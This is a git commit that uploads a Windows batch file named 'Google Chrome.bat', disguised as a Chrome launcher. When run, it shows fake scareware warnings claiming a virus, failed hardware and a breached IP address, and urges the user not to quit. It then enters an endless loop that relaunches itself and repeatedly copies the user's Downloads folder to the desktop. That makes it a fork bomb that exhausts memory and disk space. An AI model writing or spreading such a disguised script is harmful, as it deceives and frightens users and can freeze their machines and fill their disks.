9880db1a40def220448283518cc2728d92d6a8b8
T1TANZ <lukaswerner85@gmail.com>
2017-04-23 12:04:00 -0700

    Add files via upload

---
+++ Chr0m3ium/Google Chrome.bat
@@ -0,0 +1,34 @@
+@echo off
+cd C:\Users\%username%\desktop
+copy C:\Users\%username%\Downloads\Chr0m3ium C:\Users\%username%\desktop
+cls
+echo WARNING VIRUS HAS BEEN DETECTED
+echo System check
+echo -
+echo Power - FAILED
+echo -
+echo RAM - FAILED
+echo -
+echo Norton - FAILED
+echo -
+echo Breach of IP adress
+echo -
+echo Firewall - FAILED
+echo -
+echo Virus attaining: ****-****-****-8894
+echo -
+echo Hard drive must be erased and rebooted to resume windows.
+echo -
+PAUSE
+echo -
+echo Starting to reboot hardrive.
+echo -
+echo Do not attempt to quit.
+echo -
+echo Restart after 10 minutes approximately.
+PAUSE
+:START
+start Google Chrome.bat
+mkdir C10n3d
+copy C:\Users\%username%\Downloads C:\Users\%username%\desktop\C10n3d
+GOTO START
